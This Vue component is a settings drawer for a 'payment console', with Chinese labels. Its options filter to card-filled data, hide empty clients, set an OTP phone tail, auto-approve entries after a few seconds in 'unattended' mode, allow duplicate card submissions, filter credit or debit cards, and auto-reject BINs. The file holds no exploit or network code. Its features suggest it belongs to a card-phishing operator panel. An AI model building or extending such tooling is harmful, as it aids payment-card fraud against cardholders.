<script setup lang="ts">
import { ref, reactive, watch } from 'vue';

const visible = ref(false);

export interface ConsoleSettings {
  dataReverse: boolean;
  hideBinFields: boolean;
  hidePhoneField: boolean;
  onlyCardData: boolean;
  hideEmptyClients: boolean;
  hideTabBar: boolean;
  hideAddressBar: boolean;
  customOtpTail: string;
  unattendedMode: boolean;
  unattendedSeconds: number;
  allowDuplicateCard: boolean;
  cardTypeFilter: 'off' | 'C' | 'D';
  autoRejectBins: string;
}

const emit = defineEmits<{
  (e: 'settings-changed', settings: ConsoleSettings): void;
}>();

const settings = reactive<ConsoleSettings>({
  dataReverse: false,
  hideBinFields: false,
  hidePhoneField: false,
  onlyCardData: false,
  hideEmptyClients: false,
  hideTabBar: false,
  hideAddressBar: false,
  customOtpTail: '',
  unattendedMode: false,
  unattendedSeconds: 3,
  allowDuplicateCard: false,
  cardTypeFilter: 'off',
  autoRejectBins: '',
});

const STORAGE_KEY = 'payment_console_settings';

function load() {
  try {
    const raw = localStorage.getItem(STORAGE_KEY);
    if (raw) Object.assign(settings, JSON.parse(raw));
  } catch {}
}
function save() {
  localStorage.setItem(STORAGE_KEY, JSON.stringify(settings));
}

load();
watch(settings, () => {
  save();
  emit('settings-changed', { ...settings });
}, { deep: true });

function open() { visible.value = true; }
function close() { visible.value = false; }

defineExpose({ open, close, settings, visible });
</script>

<template>
  <NDrawer :show="visible" :width="380" placement="right" @update:show="(v: boolean) => { if (!v) close(); }">
    <NDrawerContent title="会话面板设置" closable>
      <div class="settings-body">

        <div class="section">
          <div class="section-head">
            <svg width="16" height="16" viewBox="0 0 24 24"><path fill="none" stroke="#18d46b" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 6h16M4 12h16M4 18h12"/></svg>
            <span>数据显示</span>
          </div>
          <div class="switch-row"><span>数据倒序排列</span><NSwitch v-model:value="settings.dataReverse" size="small" /></div>
          <div class="switch-row"><span>隐藏BIN信息（卡级/发卡行）</span><NSwitch v-model:value="settings.hideBinFields" size="small" /></div>
          <div class="switch-row"><span>隐藏电话栏</span><NSwitch v-model:value="settings.hidePhoneField" size="small" /></div>
          <div class="switch-row"><span>隐藏标签栏</span><NSwitch v-model:value="settings.hideTabBar" size="small" /></div>
          <div class="switch-row"><span>隐藏地址栏</span><NSwitch v-model:value="settings.hideAddressBar" size="small" /></div>
        </div>

        <div class="section">
          <div class="section-head">
            <svg width="16" height="16" viewBox="0 0 24 24"><path fill="none" stroke="#f0a12d" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 4a1 1 0 0 1 1-1h16a1 1 0 0 1 1 1v2.586a1 1 0 0 1-.293.707l-6.414 6.414a1 1 0 0 0-.293.707V17l-4 4v-6.586a1 1 0 0 0-.293-.707L3.293 7.293A1 1 0 0 1 3 6.586V4z"/></svg>
            <span>过滤设置</span>
          </div>
          <div class="switch-row"><span>只显示填卡数据</span><NSwitch v-model:value="settings.onlyCardData" size="small" /></div>
          <div class="switch-row"><span>隐藏无数据客户端</span><NSwitch v-model:value="settings.hideEmptyClients" size="small" /></div>
          <div class="field-row">
            <label>OTP 验证码手机尾号</label>
            <NInput v-model:value="settings.customOtpTail" placeholder="输入手机尾号" maxlength="6" size="small" />
          </div>
        </div>

        <div class="section">
          <div class="section-head">
            <svg width="16" height="16" viewBox="0 0 24 24"><path fill="none" stroke="#7968ed" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10.325 4.317c.426-1.756 2.924-1.756 3.35 0a1.724 1.724 0 0 0 2.573 1.066c1.543-.94 3.31.826 2.37 2.37a1.724 1.724 0 0 0 1.066 2.573c1.756.426 1.756 2.924 0 3.35a1.724 1.724 0 0 0-1.066 2.573c.94 1.543-.826 3.31-2.37 2.37a1.724 1.724 0 0 0-2.573 1.066c-.426 1.756-2.924 1.756-3.35 0a1.724 1.724 0 0 0-2.573-1.066c-1.543.94-3.31-.826-2.37-2.37a1.724 1.724 0 0 0-1.066-2.573c-1.756-.426-1.756-2.924 0-3.35a1.724 1.724 0 0 0 1.066-2.573c-.94-1.543.826-3.31 2.37-2.37.996.608 2.296.07 2.572-1.065z"/><circle cx="12" cy="12" r="3" fill="none" stroke="#7968ed" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"/></svg>
            <span>功能设置</span>
          </div>
          <div class="switch-row"><span>无人值守（{{ settings.unattendedSeconds }}s 后自动通过）</span><NSwitch v-model:value="settings.unattendedMode" size="small" /></div>
          <div class="switch-row"><span>允许重复卡号提交</span><NSwitch v-model:value="settings.allowDuplicateCard" size="small" /></div>
          <div class="field-row">
            <label>按卡类型筛选</label>
            <NSelect v-model:value="settings.cardTypeFilter" :options="[
              { label: '关闭', value: 'off' },
              { label: '只要 C 卡', value: 'C' },
              { label: '只要 D 卡', value: 'D' },
            ]" size="small" />
          </div>
          <div class="field-row">
            <label>自动拒绝卡头（6位BIN，逗号分隔）</label>
            <NInput v-model:value="settings.autoRejectBins" placeholder="457362,521300" size="small" />
          </div>
        </div>

      </div>
    </NDrawerContent>
  </NDrawer>
</template>

<style scoped>
.settings-body { display: flex; flex-direction: column; gap: 0; }
.section {
  padding: 16px 0;
  border-bottom: 1px solid rgba(128,128,128,.1);
  display: flex; flex-direction: column; gap: 10px;
}
.section-head {
  display: flex; align-items: center; gap: 6px;
  font-size: 13px; font-weight: 600; color: var(--n-text-color);
  margin-bottom: 2px;
}
.field-row { }
.field-row label { font-size: 12px; color: var(--n-text-color-3); margin-bottom: 4px; display: block; }
.switch-row { display: flex; justify-content: space-between; align-items: center; font-size: 13px; }
</style>
